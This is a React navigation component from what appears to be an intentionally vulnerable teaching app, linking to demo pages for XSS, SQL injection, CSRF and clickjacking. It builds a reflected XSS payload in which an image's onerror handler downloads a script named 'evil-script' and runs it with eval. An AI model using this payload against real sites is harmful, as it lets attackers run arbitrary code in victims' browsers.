import React, { Component } from "react";
import {
    Link
} from "react-router-dom";
import './VulnerabilitiesList.css';


class VulnerabilitiesList extends Component {
    constructor(props) {
        super(props);
        this.state = { apiResponse: "" };
    }

    callAPI() {
        fetch("http://localhost:8080/people")
            .then(res => res.text())
            .then(res => this.setState({ apiResponse: res }))
            .catch(err => err);
    }

    componentDidMount() {
        this.callAPI();
    }

    render() {
        let reflectedXss = "/reflected-xss?query=<img onerror='" +
            "var xmlHttp = new XMLHttpRequest(); " +
            "xmlHttp.onreadystatechange = function() {" +
            "    if (xmlHttp.readyState == XMLHttpRequest.DONE) {" +
            "        eval(xmlHttp.responseText);" +
            "    }" +
            "};" +
            "xmlHttp.open( \"GET\", \"http://localhost:8080/evil-script\", false ); " +
            "xmlHttp.send( null );" +
            "' src='invalid-image' />";

        return (
            <nav>
                <ul>
                    <li>
                        <Link to={reflectedXss}>Reflected XSS</Link>
                        <Link to="reflected-xss?query=cute pictures of cats">Normal usage</Link>
                    </li>
                    <li>
                        <Link to="/persistent-xss">Persistent XSS</Link>
                    </li>
                    <li>
                        <Link to="/sql-injection">SQL injection</Link>
                    </li>
                    <li>
                        <Link to="/csrf">CSRF</Link>
                    </li>
                    <li>
                        <Link to="/clickjacking">Clickjacking</Link>
                    </li>
                </ul>
            </nav>
        );
    }
}

export default VulnerabilitiesList;
